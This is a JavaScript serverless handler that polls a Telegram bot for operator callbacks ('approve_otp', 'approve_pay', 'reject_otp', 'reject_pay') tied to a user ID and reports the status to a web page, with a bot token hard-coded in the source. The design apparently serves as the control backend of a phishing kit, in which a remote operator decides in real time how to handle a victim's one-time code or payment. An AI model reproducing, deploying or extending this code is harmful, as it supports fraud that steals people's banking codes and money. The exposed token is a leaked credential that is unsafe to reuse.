export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const { user_id } = req.query;
  if (!user_id) return res.status(400).json({ status: 'pending' });

  const BOT_TOKEN = "9216807620:AAGDIyVqXUaLmN_MdiMyAxAzRY0S6KCqEGw";

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?allowed_updates=["callback_query"]`);
    const tgData = await tgRes.json();

    let status = 'pending';
    let callbackQueryId = null;

    if (tgData.ok && tgData.result) {
      for (let i = tgData.result.length - 1; i >= 0; i--) {
        const update = tgData.result[i];
        if (update.callback_query) {
          const data = update.callback_query.data;
          if (data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) {
            status = 'approved';
            callbackQueryId = update.callback_query.id;
            break;
          } else if (data === `reject_otp_${user_id}` || data === `reject_pay_${user_id}`) {
            status = 'rejected';
            callbackQueryId = update.callback_query.id;
            break;
          }
        }
      }
    }

    if (callbackQueryId) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackQueryId, text: "تم الانتقال بنجاح!" })
      }).catch(() => {});
    }

    return res.status(200).json({ status });
  } catch (err) {
    return res.status(200).json({ status: 'pending' });
  }
}
